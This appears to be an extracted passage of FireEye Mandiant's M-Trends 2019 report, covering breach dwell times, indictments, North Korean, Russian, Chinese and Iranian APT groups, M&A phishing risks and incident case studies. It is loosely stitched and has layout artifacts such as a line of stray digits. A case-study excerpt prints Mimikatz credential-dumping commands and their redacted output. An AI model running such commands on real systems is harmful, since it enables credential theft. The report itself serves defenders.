We continue to see large impactful\nincidents, though fewer high-profile public disclosures. Extortion cases are\non the rise, assisted by cryptocurrency and other forms of non-attributable\npayment. Cryptocurrencies are also directly targeted via wallets, payment\nsystems and miners.\n\nThe significant trends or shifts we saw in 2018 were:\n\n- A significant increase in public attribution performed by governments.\nRecent years have seen a significant increase in private sector attribution of\nattack activity, but the past year saw a significant number of attacks publicly\nattributed by way of indictments from the U.S., U.K., Netherlands and Germany.\nSome of these were assisted by data from private sector companies such as\nFireEye. Governments have not changed their operational rules of engagement,\nbut they are combating threats publicly through indictments.\n\n- As more and more customers move to software as a service and cloud,\nattackers are following the data. Attacks against cloud providers, telecoms, and\nother organizations with access to large amounts of data have increased.\n\n\n-----\n\n_M-Trends 2019 looks at some of the latest trends_\nrevealed through FireEye incident response\ninvestigations by FireEye Mandiant. These include\nevolving APT activity in various regions, phishing\nrisks during mergers and acquisitions, and some\ndefensive trends that we consider best practices.\n\nWe also answer the question that everyone asks:\nAs an industry, are we getting better at detecting\nthreat actors? We are quite pleased to announce\nthat the answer is a big yes. From October 1,\n2017, to September 30, 2018, the global median\ndwell time was 78 days. That means attackers are\noperating for just under three months, on average,\nbefore they are detected. That’s roughly a quarter\nof the global median dwell time of 101 days in last\nyear’s report—a modest improvement.\n\nIt wouldn’t be M-Trends if we didn’t include a\nvariety of case studies to demonstrate exactly\nwhat we saw in the field that enabled us to\nprovide the information in this report. This year,\nwe show how early identification is key by diving\ninto an incident involving attacker activity now\nattributed to the threat group TEMP.Demon. We\nalso discuss an incident at a Southeast Asia-based\ninternational telecommunications company that\nstarted with an extortion email sent from the\nCEO’s work account by an attacker.\n\nWhen we launched our first M-Trends report 10\nyears ago, we had one primary goal—and that\nhasn’t changed: to arm security teams with the\nknowledge they need to defend against today’s\nmost often used cyber attacks, as well as lesser\nseen and emerging threats.\n\nThe information in this report has been sanitized\nto protect identities of victims and data.\n\n\n###### Several indictments announced in 2018:\n\n**March: Islamic Revolutionary Guard Corps**\nIn an indictment, the U.S. Departments of Justice\nand Treasury accused Iran of stealing intellectual\nproperty from more than 300 universities, as well\nas government agencies and financial services\ncompanies.[1]\n\n**July: Russian Intelligence Officers**\nThe U.S. Department of Justice announced the\nindictments of 12 Russian intelligence officers\nfor carrying out large-scale cyber operations\nagainst the Democratic Party in advance of the\n2016 Presidential election. The officers’ alleged\ncrimes included the theft and subsequent\nleakage of emails from the Democratic National\nCommittee and Hillary Clinton campaign, and\nthe targeting of election infrastructure and local\nelection officials in an attempt to interfere with\nthe election.[2]\n\n**August: FIN7 Cyber Crime Group**\nUkrainian nationals were indicted for\nparticipating in a prolific cyber crime group\nwidely known as FIN7. They were accused of\nengaging in a highly sophisticated malware\ncampaign that resulted in the theft of millions of\ncustomer credit and debit card numbers.[3]\n\n**September: Financial Institutions Hack**\nThe U.S. Department of Justice announced the\nindictment and extradition of a Russian hacker\naccused of participating in the hack of JP\nMorgan Chase in 2014, leading to the theft of\ndata from over 80 million customers, “the largest\ntheft of customer data from a single U.S. financial\ninstitution in history.”[4]\n\n**September: North Korea Sony Hack**\nThe U.S. Department of Justice announced the\nindictment of Park Jin Hyok, a North Korean\nhacker allegedly involved in the 2014 Sony hack,\nthe 2016 theft of $81 million from a Bangladeshi\nbank, and the WannaCry ransomware attacks.[5]\n\n\n1 United States Department of Justice (March 23, 2018).

While there was a modest decrease in dwell time, the dwell\ntimes by engagement varied in large measure. We saw an uptick in financially\nmotivated compromises such as ransomware and business email compromise,\nwhich tend to have both immediate impact and immediate detection by the\ntargeted organization. Additionally, the decrease in dwell time can be attributed\nto organizations that continually develop and improve their internal hunting\ncapabilities and enhanced network, endpoint and cloud-service provider visibility.\n\n**500**\n\n**474**\n\n**400**\n\n**300**\n\n**305**\n\n**200**\n\n**175** **177**\n\n**100** **128**\n\n**106**\n\n**83** **61**\n\n**0** **24.5**\n\n2016 2017 2018\n\nThe overall dwell time of 177 days remained largely unchanged from 175 days in\n2017. However, we have seen an increase in both Internal and External dwell times,\nreflecting the changing trend in EMEA. Organizations, and in particular Boards, are\ntaking cyber security far more seriously. This has been in part driven by regulation\nsuch as GDPR, but also due to increased recognition of the risk presented by\ntargeted cyber attackers.\n\n**_Continued on next page_**\n\n\n-----\n\n###### EMEA MEDIAN DWELL TIME CONTINUED\n\n APAC MEDIAN DWELL TIME\n\nNOTIFICATIONS All\n\nExternal\n\nInternal\n\nMEDIAN DWELL TIME\n\n\n###### 498\n\n**DAYS IN 2017**\n\n\n###### 204\n\n**DAYS IN 2018**\n\n\nThe underlying data shows that while many organizations are dealing with\nadvanced threat actors much faster than ever before, security teams are still\nuncovering historical attacks. Therefore, the increased Internal and External\ndwell times reflect the attention that organizations are placing on effective\nsecurity measures\n\nThe increasing gap between internal and external notification reinforces the\nimportance for organizations to have strong detection and remediation strategies.\nExternal notification cannot be relied upon as a meaningful detection strategy.\n\n**1200**\n\n**1088**\n\n**1000**\n\n**800**\n\n**600**\n\n**498**\n\n**400**\n\n**320.5**\n\n**200** **262**\n\n**204**\n\n**172**\n\n**0** **158**\n\n2016 2017 2018\n\nThe median dwell time across APAC was 204 days, indicating improvement over\nthe previous year’s statistic of 498 days, but more comparable to the 172 days\nin 2016.\n\nThese statistics reflect an increase in more quickly detected breaches due to\ncompromises with near-immediate impact on organizations, although scale and\ncomplexity of attacks also increased, which median dwell time doesn’t represent.\nNotably, outlier dwell time values of more than seven years clearly indicate that the\nfight against undetected compromises has not yet been won. We have observed\nattacks by many known adversaries who continue to succeed with the same or\nvery similar TTPs as before, illustrating that targeted attackers continue to succeed\nin their missions and many known threats are left unaddressed. This is also evident\nby the high percentage of cyber attack victim organizations being retargeted.\n\n\n-----\n\n###### DETECTION BY SOURCE Organizations are getting better at discovering compromises internally,\nas opposed to being notified by external sources. In 2018, almost 60% of\ncompromises were internally detected.

Unlike\nmany cyber criminals, APT attackers often pursue their\nobjectives over greater lengths of time, typically months\nor years. They rapidly adapt to a victim organization’s\nattempts to remove them from the network and frequently\ntarget the same victim again if access is lost.\n\n\n-----\n\nIn 2018, FireEye promoted four attack groups from previously tracked TEMP groups to APT groups.\n\n**How a threat activity group becomes an APT group**\n\n  - Newly identified clusters of “interesting” activity gathered from Mandiant Incident Response\nattack surface data, technical and threat intelligence research, and proprietary methods\nare tracked internally across our Knowledge Center. Our team of technical and threat\nresearchers, analysts and reverse engineers begin their work from known indicators and\nattempt to find related indicators, activity or other data. When only a small cluster of\nactivity is found, we reference that activity in finished intelligence (FINTEL), which may\ninclude data published to the FireEye Intelligence Portal and external blogs without a formal\nname.\n\n**Example: “Suspected Iran-based nation-state threat actors sent spear phishing emails….”**\n\n  - Some clusters develop further with, for example, sufficient or consistent reporting that\nidentifies their tactics, tools and procedures (TTPs). In these cases, the cluster is given a\ntemporary “TEMP.<xxx>” group name. For example, APT37 was previously reported as “TEMP.\nReaper” group.\n\n\n\n- As a TEMP group becomes sufficiently mature, the actor will be assigned a formal APT or\nFIN number. APT groups are nation-state actors generally focused on espionage activities.\nFIN groups are highly organized criminal groups that engage in high-level financial crime\nsuch as business email fraud and extortion activities. The methodology for naming an APT or\nFIN group is identical in nature. One example of maturity is that there is enough evidence to\nbelieve the cluster activity represents an actual group, and confidence the activity is not part\nof an existing group.\n\n\n-----\n\n#### APT37\n\n###### February 19, 2018\n\n\n#### APT37\n\n\n-----\n\nWe assess that the primary mission of APT37 is covert\nintelligence gathering in support of North Korea’s strategic\nmilitary, political and economic interests. This hypothesis\nis based on their consistent targeting of South Korean\npublic and private entities and social engineering. This\ngroup’s recently expanded scope also appears to have\ndirect relevance to North Korean strategic interests. North\nKorean defector and human rights-related targeting\nprovides further evidence that APT37 conducts operations\naligned with North Korean interests. Targets including\na research fellow, advisory member, and journalist\nassociated with various North Korean human rights issues\nand strategic organizations were victims of APT37 attacks.\nA Japanese entity associated with the United Nations’\nsanctions mission and human rights was also a target.\n\n**Figure 1.**\nAPT37 TTPs across\nthe attack lifecycle.\n\n\nIn July 2018, FireEye Intelligence experts uncovered a\nreunification-themed email, sent to multiple recipients,\nthat possessed a weaponized HWP attachment that was\nlikely used against South Korean government agencies. A\nconnection was identified by observing the use of Korean\nPeninsula reunification/unification-themed email lures in\nprevious APT37 operations.\n\nNorth Korea has repeatedly demonstrated a willingness\nto leverage its cyber capabilities for a variety of purposes,\nundeterred by international norms. Though it has primarily\ntapped into other suspected North Korean teams to carry\nout the most aggressive actions, APT37 is an additional\nresource available to the regime, perhaps marked as even\nmore desirable for its relative obscurity. We anticipate\nthat APT37 will be leveraged in previously unfamiliar roles\nand regions, especially as pressure continues to mount on\nNorth Korea.\n\n|Figure 1.

APT38 executes sophisticated bank heists that\ntypically feature long planning, extended periods of\naccess to victim environments preceding any attempts\nto steal money, fluency across mixed operating systems,\nthe use of custom developed tools and constant effort to\nthwart investigations capped with a willingness to destroy\ncompromised machines.\n\n\n#### APT38\n\n**947230**\n\n\n-----\n\nBased on observed activity, we judge that the primary\nmission of APT38 is targeting financial institutions and\nmanipulating inter-bank financial systems to raise large\nsums of money for the North Korean regime. Increasingly\nheavy and pointed international sanctions have been\nlevied on North Korea following the regime’s continued\nweapons development and testing. The pace of APT38\nactivity reflects increasingly desperate efforts to steal\nfunds to pursue state interests, despite growing economic\npressures on the city of Pyongyang. Since 2015, APT38\nhas attempted to steal hundreds of millions of dollars from\nfinancial institutions.\n\n**Figure 2.**\nAPT38 TTPs across\nthe attack lifecycle.\n\n\nBased on the vast resources and networks dedicated\nto compromising financial targets and stealing funds\nover the last few years, we believe APT38 operations\nwill continue to persist. In particular, the number of\nSWIFT heists thwarted in recent years, coupled with the\ngrowing awareness for cyber security around the financial\nmessaging system, could drive APT38 to employ new TTPs\nto obtain stolen funds—especially if North Korea’s access\nto currency continues to deteriorate.\n\n|Figure 2.

APT39 has prioritized the\ntelecommunications sector, with additional targeting of the\ntravel industry and supporting IT firms, as well as the hightech industry. Malware distribution data, files names and\nrelated command and control (CnC) domains suggest that\nAPT39’s targeting may also extend to transportation and\ngovernment entities in Israel and Kuwait.\n\n\n-----\n\nAPT39’s focus on the telecommunications and travel\nindustries suggests intent to perform monitoring, tracking\nor surveillance operations against specific individuals, collect\nproprietary or customer data for commercial or operational\npurposes that serve strategic requirements related to\nnational priorities, or create additional accesses and vectors\nto facilitate future campaigns. Government-entity targeting\nsuggests a potential secondary intent to collect geopolitical\ndata that may benefit nation-state decision making.\nTargeting data supports the belief that APT39’s key mission\nis to track or monitor targets of interest, collect personal\ninformation such as travel itineraries and gather customer\ndata from telecommunications firms.\n\nAPT39’s activity largely aligns with a group publicly\nreferred to as “Chafer.” However, there are differences\nin what has been publicly reported due to the variances\nin how organizations track activity. For example, some\nAPT39 activity has also been publicly reported as “OilRig,”\na group that loosely aligns with APT34. While APT39\nand APT34 share some similarities, including malware\n\n**Figure 3.**\nAPT39 TTPs across\nthe attack lifecycle.\n\n\ndistribution methods, POWBAT backdoor use, infrastructure\nnomenclature and targeting overlaps, we consider APT39 to\nbe distinct from APT34 given its use of a different POWBAT\nvariant. It is possible that these groups work together or\nshare resources at some level.\n\nWe believe APT39’s significant targeting of the\ntelecommunications and travel industries reflects efforts\nto collect personal information on targets of interest and\ncustomer data for the purposes of surveillance to facilitate\nfuture operations. Telecommunications firms are attractive\ntargets because they store large amounts of personal and\ncustomer information, provide access to critical infrastructure\nused for communications and enable access to a wide\nrange of potential targets across multiple verticals. APT39’s\ntargeting not only represents a threat to known targeted\nindustries, but it extends to these organizations’ clients,\nwhich include a wide variety of sectors and individuals on a\nglobal scale. Considering this, we infer that APT39’s mission\nis to collect personal information that satisfies Iran’s national\nsecurity priorities.\n\n|Figure 3. APT39 TTPs across he attack lifecycle.

Previous FireEye\nreports referred to the group as “TEMP.Periscope,” although\nAPT40 also incorporates the group previously dubbed\n“TEMP.Jumper.”\n\n\n#### APT40\n\n\n-----\n\nAPT40 reliably targets the engineering, transportation and\ndefense sectors, especially where these sectors overlap\nwith maritime technologies. Targeting of universities and\nsimilar institutes conducting maritime-related research\nfurther supports the assessment that APT40 is specifically\nfocused on maritime and naval issues. Although observed\ntargeting has been broad and cuts across multiple industries,\naffected organizations generally focus on engineering and\ndefense. The group’s operations tend to target governmentsponsored projects and take large amounts of information\nspecific to such projects, including proposals, meetings,\nfinancial data, shipping information, plans and drawings, and\nraw data.\n\nAlthough APT40 activity declined after the Obama-Xi\nagreement in 2015, by December 2017, the group resumed\ntargeting U.S. entities in aircraft transportation, industrial\nequipment and education. Organizations with operations in\nSoutheast Asia or involved in South China Sea disputes have\nalso been targeted by APT40.\n\n**Figure 4.**\nAPT40 TTPs across\nthe attack lifecycle.\n\n\nWe assess with high confidence that APT40 is attributable\nto Chinese cyber espionage operators based on a variety\nof factors. APT40 has used Internet Protocol (IP) addresses\nlocated in Hainan, China, as well as other locations in\nmainland China. Additionally, APT40 infrastructure has\nrelied on the use of domain resellers with Chinese contact\ninformation. Analysis of the operational times of the group’s\nactivities indicates that it is probably centered around Beijing\ntime (UTC +8). Further, APT40 has used malware families\nobserved in other Chinese cyber operations, which indicates\npossible collaboration between groups.\n\nAPT40 is a moderately sophisticated cyber espionage\ngroup that demonstrates access to significant development\nresources, as well as the ability to leverage shared and\npublicly available tools. Although the group has not been\nobserved exploiting zero-day vulnerabilities, it often\nweaponizes vulnerabilities within days of public disclosure.\nSince 2013, APT40 has come to leverage an enormous library\nof tools and can shift operations to new targets as required.\nDespite increased public attention, APT40 has remained\nundeterred from conducting cyber espionage operations,\nand we anticipate its operations will continue through at least\nthe near and medium term.\n\n|Figure 4.

For Russia, the main catalysts\nhave been political adversaries, national\ndefense, Ukraine and energy. There are also\nsome indicators that Russian APT actors\nare prepared to carry out disruptive and\ndestructive attacks, and conduct internal\nand external monitoring of Russian citizens.\n\nPRE-2004 2004-2012 2013- 2016 2016-2018\n\n|RUSSIA|Col2|\n|---|---|\n\n\nRussian activity was largely\nfocused on government\ntargets.\n\n\nThere was limited visibility\nduring the initial stages of what\nwas likely the developmental\nyears of Russian APT activity.\nThe majority of their operations\ncame to light around 2007.\nRussia’s three primary\nteams, APT28 (Tsar), Turla\nand Sandworm formed the\nbackbone of known Russian\nintrusion activity and maintain\nthat influence to present day.\nThe early stages of Russian\nAPT activity focused on NATO,\nEastern Europe (government\nand energy sectors) and foreign\nministries.\n\n\nThe beginning of this period\nsaw all core Russian APT\ngroups hitting the energy\nsector, including newly\nobserved operators such as\nTEMP.Isotope and the now\ndefunct Koala Team. In 2015,\nAPT29 (Monkey) appeared to\ntarget Western governments,\nforeign affairs and policymaking\nbodies, government\ncontractors, universities and\npossibly an international news\noutlet.

It appears that\nSandworm took on a specialized\ncampaign that included the\nU.S. and Europe. Targeting of\nU.S. and French elections were\nlikely a major goal. Russian\nactors were also noted using\nwiper attacks during the\nWinter Olympics. Russian APT\ncampaigns have been highly\ninnovative in terms of social\nengineering, plausible deniability\nand aggressiveness. Russian\ncyber espionage actors continue\nto conduct brazen, global\noperations against political\nand international organizations\naligned with Moscow’s strategic\ninterest despite public exposure\nand legal indictments.\n\n\n-----\n\n###### RUSSIAN APT ACTIVITY IN 2018\nRussian cyber espionage groups continued to conduct global operations against political and international organizations\naligned with Moscow’s strategic interests. In the second quarter of 2018, Russia-nexus espionage groups, notably the\nSandworm Team, demonstrated a renewed interest in targeting Ukrainian entities across several verticals. In the third\nquarter, public exposure and legal indictments against Russian APT actors failed to deter Russian-sponsored intrusion\ncampaigns. Continued targeting of NATO suggest that the organization is perceived as a threat to Moscow’s security and\nglobal ambitions. One of the more interesting aspects of Russian APT activity in 2018 was the use of destructive attacks\nagainst select targets.\n\n\n\n- Russian operations maintained a\nbroad-scope interest in a variety\nof sectors and geopolitical\nevents. Significant activity was\nconducted in relation to prominent\ninternational events, including\nthe Winter Olympic games. The\nprimary focus has been traditional\nespionage, but a focus on Ukraine\nand Poland may portend future\nevents for 2019.\n\n- In the second quarter of 2018,\nFireEye began to see renewed\ninterest in Ukraine targets,\npotentially signaling further\nstrategic and operational pushes\ninto the country. Targeting of\nPoland in the last quarter of\nthe year may suggest similar\nobjectives.\n\n- In the third quarter of 2018, the U.S.\nDepartment of Justice released\nan indictment against 12 Russian\nintelligence officers that describes\ntheir work in the Russian Main\nIntelligence Directorate (GRU) to\ncompromise and leak information\nfrom Democratic political entities\nand compromise the U.S. election\ninfrastructure. The indictment\noffered a deeper understanding\nof the military intelligence\n\n\norganization behind this activity,\nwhich was attributed to GRU Units\n26165 and 74455. An initial analysis\nof the indictment suggests that\nthese GRU units correlate with\nthreat actors we track as APT28\n(Tsar) and Sandworm Team,\nrespectively.\n\n- In 2018, we revealed that Turla\nTeam operators were targeting\nEuropean government agencies\nusing newly discovered or updated\ntoolsets, including XTRANS\nmalware.\n\n- New samples of the previously\nreported WEATHERMAN dropper\nand FAÇADE malware were also\nexamined. Turla frequently targets\ngovernment agencies, including\nministries of foreign affairs, in\nNATO, EU and other countries, to\ngather diplomatic and security\nintelligence relevant to Russia’s\nnational interest.\n\n- In the fourth quarter of 2018, Turla\nTeam was suspected of targeted\nEuropean energy policy and\ndiplomacy entities.\n\n- During 2018, FireEye was able\nto link TEMP.Veles and the Triton\nframework to a Russian entity.\n\n\n**XTRANS malware**\nis a backdoor that\nleverages email\nmessaging to receive\nand execute commands\nand exfiltrate data\nthrough specifically\nformatted JPEG and\nPDF email attachments.\nXTRANS can collect,\nblock, read and modify\nemail messages, and\nleverages a Microsoft\nExchange transport\nagent in parallel to\nreceive and process\nemail messages\ndelivered to the\nExchange server.\n\n\n-----\n\n**Russian APT Actors**\n\n\n**Industries Targeted**\n\n\n**Figure 6.**\nSample of Russian\nAPT actors active\nin 2018, along with\ntargeted countries\nand industries.\n\n\nAPT28 (Tsar)\n\nSandworm Team\n\nTEMP.Armageddon\n\nTEMP.Isotope\n\nTEMP.Veles\n\nTurla Team\n\n\nDefense\n\nEnergy\n\nForeign Affairs\n\nGovernment\n\nLaw Enforcement\n\nMedia\n\nNATO\n\nWinter Olympics\n\n\n-----\n\nPRE 2004\nEarly Chinese cyber espionage operations were\nunsophisticated (by today’s standards), noisy,\neasy to detect and targeted a wide variety\nof industries with little consequence to the\nattackers. Distinct groups, such as APT1, were\nidentifiable because of specific TTPs as well\nas malware tools that could be tracked back\nto sponsoring organizations or even individual\nactors. Chinese espionage operations were run\nby both military units and civilian organizations.\nContractors were also used, and there was\nsignificant overlap in espionage activity from\nthese actors and the financially motivated\ncampaigns they were also operating. Chinese\ncyber espionage is primarily restricted to/\nfocused on government targets.\n\n2004-2013\nGradual target expansion into the defense\nindustrial base, then M&A targets and\ncommercial entities doing business in China,\nup to the revealing of PLA Unit 61398 to the\nworld in February of 2013.\n\n2013- 2015\nReduction in activity starts.\n\n2015 - 2016\nLate 2015 saw Chinese cyber espionage\nactivity begin to significantly decline,\nespecially against the U.S. Besides the widely\npublicized Obama-Xi agreement to end cyberenabled intellectual property theft, the PLA\nalso underwent a significant reorganization\nto consolidate cyber-related functions, and\nthe Chinese government at large shifted its\nnational priorities in line with the 13th Five\nYear Plan (2016–2020).\n\n2017 – 2018\nSome Chinese espionage operators reemerged and renewed operations, including\nAPT20 and Conference Crew. Other actors\nappear to have been reorganized in some\nway, such as APT15 (Social Network). Cyber\nespionage activities also moved away from\ndirect intellectual property theft (especially\ntargeting the West) and shifted toward\nstrategic espionage campaigns, especially\ntargeting Southeast Asia, South Asia\nand Central/Western Asia. In most cases,\nresurgent groups leveraged revamped TTPs\nthat relied on more publicly available malware\ntools. During this time period, China’s Belt and\nRoad Initiative became a key national priority\nand subsequently a driver for intrusion\ncampaigns likely to support successful\ncompletion of the massive project.\n\n\n-----\n\n###### CHINESE APT ACTIVITY IN 2018\nMany Chinese APT groups have resumed their regular tempo after a period of reduced activity that started in\n2016. These groups have re-emerged with modified TTPs and refreshed malware tools. Activity believed to be\nlinked to state-backed operators now appears to be relatively focused on maintaining strategic intelligence\nand focusing on geopolitical developments.\n\n\n\n- The People’s Liberation Army has had more\nthan a year to consolidate and reorganize\nits cyber resources under their Strategic\nSupport Forces, and the decreased\nnumber of distinct Chinese espionage\ngroups currently and actively conducting\noperations is possibly reflective of more\ncentralized operations, but not necessarily\nless overall activity.\n\n- We believe the Chinese government\ntemporarily curtailed activity associated\nwith civilian operators such as the Ministry\nof State Security.\n\n- Although re-emergent groups have\nmodified their TTPs, technical indicators\ncan still provide a link to previous activity.\nFor example, APT20 (Twivy) returned using\nits signature malware COOKIECLOG and\nCETTRA, and Conference Crew returned\nusing its signature malware suite of EVORA,\nELISE and EMISSARY.\n\n- Some individual actors who were part of\ndormant groups were reorganized into\nnew operational teams or reassigned to\nexisting known groups, most likely reflecting\nsignificant and widespread restructuring of\nChina’s cyber espionage capability.\n\n\n\n- Shifts in regional focus and targeting most\nlikely reflect changing priorities shaped\nby altered trade agreements, geopolitical\ndevelopments, and China’s own refocus on\nregional expansion such as the Belt and\nRoad Initiative.\n\n- Most of the re-emergent Chinese espionage\ngroups have become increasingly reliant\non publicly available malware, especially\nBEACON and EMPIRE. Relatedly, operators\nsuch as APT10 (Menupass) are deploying\nnew malware that is largely modified from\npublicly available tools and enhancing\ntheir capabilities and capacity to employ\nadditional malware quickly.\n\nWe believe China’s Belt and Road Initiative\n(BRI), a $1 trillion strategic effort to expand\nland and maritime trade routes across Asia\nand parts of Africa, has become a significant\ndriver of Chinese cyber espionage activity.\nThese operations support the BRI endeavor\nthrough the collection of business intelligence\non major projects and agreements.\n\nAdditionally, campaigns are monitoring\nelections and tracking regional power shifts\nthat could impact Chinese investments and\nBRI-related expansion activity.\n\n\n-----\n\n**Figure 7.

The\ndamage caused by the Stuxnet virus, in\nconjunction with internal dissent activities\nspurred by social media, pushed the regime\nto make defensive and offensive cyber\nwarfare capabilities a priority, resulting in\nthe establishment of the national cyber\ncommand in 2011.\n\n\nIran showed an increasing propensity\nto adopt cyber operations as a form of\nasymmetric warfare, launching campaigns\ndesigned for retaliation (against U.S.\nfinancial sector for sanctions), deterrence\n(Shamoon), political influence and\ncompetition. It is also suspected that\nstate-sponsored organizations are likely\ndirecting, working in concert with or\nparalleling independent actors (Ajax\nTeam). Targeting also expanded to include\nthe collection of adversary capabilities in\nthe U.S. defense industrial base sector.\n\n\nIran’s cyber capabilities grew at an\nexponential rate from the observance\nof APT35 (Newscaster) carrying out\nrudimentary intelligence collection using\nsocial media to the likely development/\nspecializing of new and currently dormant\nAPT teams and groups (APT33, APT34,\nAPT39, Beanie Team, Jafar Team, TEMP.\nLice, TEMP.Omega and TEMP.Zagros). We\nalso detected a shift from being reactive\nto proactive with the incorporation of\nstrategic targeting of Europe.\n\n\n-----\n\n###### IRANIAN APT ACTIVITY IN 2018\nThroughout 2018, Iran continued to pose one of the\ngreatest global cyber espionage threats, expanding\nits campaign activity in both scope and scale. It\nremained the biggest threat to the Middle East by\nhitting all major sectors. Strategic objectives clearly\nextended beyond the immediate Middle East region,\nas witnessed by worldwide intrusion activities that\naligned with the regime’s interests.\n\n\n**Iranian APT Actors**\n\n\n\n- Iranian APT activity trends in 2018 demonstrated that\ncyber espionage was leveraged to a greater extent\nin state-sponsored efforts to shape and define the\nglobal environment. In addition to saturated targeting\nof the Middle East/Gulf States, Iranian APT campaigns\nextended to North America, Eurasia and parts of Asia.\n\n- Targeting trends for Iran’s 2018 activities remained\nfairly constant over all four quarters of 2018, primarily\nfocusing on national security, finance/energy, foreign\naffairs and dissident activity. Policies such as the U.S.\nwithdrawal from the U.S.-Iranian nuclear deal may have\nbeen a catalyst for intrusion activity.\n\n**Industries Targeted**\n\nDefense\n\nEnergy\n\nFinancial\n\nForeign Affairs\n\nGovernment\n\nHuman rights\n\nTelecommunications\n\nMedia\n\n\n**Figure 8.**\nSample of Iranian\nAPT actors active\nin 2018, along with\ntargeted countries\nand industries.\n\n\nAPT33\n\nAPT34\n\nAPT35\n\nAPT39\n\nTEMP.Zagros\n\n\n-----\n\n**Conclusion**\nIn 2018, North Korea, Russia, China and Iran posed the\ngreatest global cyber espionage threats worldwide.\nMotivated by security and economic concerns, North\nKorean operators matured in both technical and\noperational sophistication. Russian cyber espionage\nactors have continued to operate worldwide, targeting\npolitical entities relevant to Russia’s strategic national\ninterests. Dormant Chinese espionage teams returned\n\n\nand reinvented their operations, as observed during the\ncourse of Mandiant incident response engagements.\nIran-nexus intrusion activity demonstrated an expanded\nuse of cyber espionage operations to collect strategic\ninformation on national security, economics and the\ninternal security of their targets. Finally, open-source\ntools are now used across most major APT operators,\nwhich increases the challenge of definitive attribution.\n\n\n-----\n\n###### HIDDEN PHISHING RISKS DURING M&A\n\n 1298234298263987 4293847293847293 8472938472938472 9387429837429834 7293847293568420 3948203948029362 9387492387429387 9283473847293847 2938479129823429 8263987429384729 3847293847293847 2938472938742983 3847293847293847 2938472938742983\n\n\n-----\n\n-----\n\nWe observed an increase in phishing attacks where a\ncompromised email account was used to send phishing\nemails to additional users in the organization.

Establishing forwarders allows attackers\nto collect email on an ongoing basis, without the need\nto authenticate to the organization’s email solution.\nRemoving the need to authenticate reduces the likelihood\nthe attacker’s access to email will be discovered.\n\n**Malware Installation**\nIn the wild, we also observed the exploitation of\nvulnerabilities in Outlook configuration. The attacker\nlogged in and changed the Outlook homepage setting\nwithin the victim account. The next time the victim logged\non within the corporate environment, the system was\nredirected to the attacker’s webpage and compromised\nwith malware that provided a foothold for the attacker\ninside the network. Similarly, we saw the deployment of\na .NET backdoor capable of, among other things, the\ndownload, upload and execute functions through the\nabuse of Outlook Add-Ins. This backdoor also created a\nhidden folder for messages and a rule to move messages\nto that folder, enabling the use of the account for further\nphishing attacks invisible to the user. These vulnerabilities\n_have been patched by Microsoft._\n\n**Conclusion**\nWe expect unauthorized access to email, particularly\nduring M&A, to remain a common source of attack for\nthreat actors of varying intent and sophistication. We\nalso expect that the TTPs will evolve with security tools\nand monitoring.\n\nThreat actors will continue to increase the effectiveness\nof subsequent stages of the targeted attack lifecycle\n(such as maintaining persistence or data exfiltration).\nOrganizations will need to adapt their email defenses and\nmonitor attacker techniques to improve their detection\nand response capabilities. This will require continued\nvigilance, which includes threat intelligence for visibility\ninto evolving attacker TTPs or campaigns, and appropriate\nsecurity solutions aimed at detecting malicious links or\nattachments in emails.\n\n\n###### Recommendations\n\nFireEye recommends the following mitigation and detection\nstrategies as part of the M&A process:\n\n1. Conduct a compromise assessment of the acquisition to\nattempt to identify any current or previous compromises.\n\n2. Conduct a proactive review searching for evidence of\npotential attacker activity within the acquiring and acquired\nnetworks before integrating them.\n\n3. Audit rights to identify accounts with access to other users’\nemail.\n\n4. Disallow the automatic forwarding of email outside the\norganizations or regularly audit the forwarding rules on\ntheir organization’s mail servers to detect evidence of this\ntechnique.\n\n5. Enable audit logging on O365.\n\n6. Enable multi-factor authentication on O365.\n\nThe following PowerShell command can be used to restrict auto\nforwarding of emails to remote domains:\n\n\nSet-RemoteDomain Default\n-AutoForwardEnabled $false\n\n\nThe following PowerShell command can be used to enumerate the\nforwarding rules for mailboxes on an Exchange server:\n\n\nGet-Mailbox | where {($.ForwardingAddress\n-ne $null -or $.ForwardingSMTPAddress\n**-ne $null)}| select Name,**\nForwardingAddress, ForwardingSMTPAddress,\nDeliverToMailboxAndForward\n\n\n-----\n\n###### CASE STUDIES\n\n 09:03 10:57 12:21 13:40 14:01 14:33\n\nUsing ‘rsa.log for logfile : OK\n\nmimikats # sekursla: :minidump C:\\Users\\user\\Desktop\\rsa.dmp\nSwitch to MINIDUMP : ‘C:\\Users\\user\\Desktop\\rsa.dmp’\n\nmimikatz # sekurlsa: :logonpasswords\nOpening : ‘C:\\Users\\user\\Desktop\\rsa.dmp’ file for minidump...\n\nAuthentication Id : 0 ; 1726155 (00000000:001a56cb)\nSession      : RemoteInteractive from 2\nUser Name     : user103\nDomain      : CUSTOMER\nLogon Server   : CUSTOMER-DC1\nLogon Time    : 3/13/2018 12:22:37 PM\nSID        : S-1-5-21-123456789-0123456789-123456789-1234\nmsv :\n[00000003] Primary\n                                                                            - Username : user103\n                                                                            - Domain  : CUSTOMER\n                                                                            - NTLM   : 9f<REDACTED>f1d4e\n                                                                            - SHA1   : 8cd<REDACTED>68897b645\n                                                                            - DPAPI  : ce3<REDACTED>6d0f7\ntspkg :\n                                                                            - Username : user103\n\nDirectory: C:\\Users  - Domain  : CUSTOMER\n\n                                                                            - Password : <REDACTED>\n\nMode LastWriteTime Length Name\n---- ------------- ------ ----\nd---- 9/14/2016 5:15 PM .NET v2.0\nd---- 9/14/2016 5:15 PM .NET v2.0 Classic\nd---- 9/14/2016 5:15 PM .NET v4.5\nd---- 9/14/2016 5:15 PM .NET v4.5 Classic\nd---- 9/9/2016 12:12 PM Administrator\nd---- 1/17/2017 5:44 PM CUSTOMER_ADMIN7\nd---- 9/14/2016 5:15 PM Classic.NET AppPool\nd---- 7/17/2017 4:03 PM cUSTOMER_ADMIN15\nd---- 9/14/2016 8:21 AM CUSTOMER_ADMIN10\n\n---------------------------------------------------\n\nDirectory: C:\\data\n\n\n-----\n\n###### Mistaken Identity\n\nIn the second half of 2018, FireEye Mandiant began The attacker leveraged a web content management\nresponding to and tracking attacker activity now system vulnerability to install webshell variants such as\nattributed to the threat group TEMP.Demon. This group DEVILZSHELL, ASPXSHELL, WEBSNIFF and TABLETOP\nleveraged a vulnerability from a popular web content on Internet-facing web servers. The attacker then used\nmanagement system to gain access to companies in the publicly available webshells to remotely execute code\nfinancial sector. Victims included both FireEye product and elevate privileges on the compromised Windows\ncustomers and FireEye managed detection and response servers. The attacker executed publicly available\ncustomers. Visibility across our product and service credential harvesting tools, such as Procdump, Mimikatz\nportfolios allowed Mandiant consultants to quickly identify and SafetyKatz to obtain local and domain credentials,\n\n\nStolen domain credentials were used to rapidly 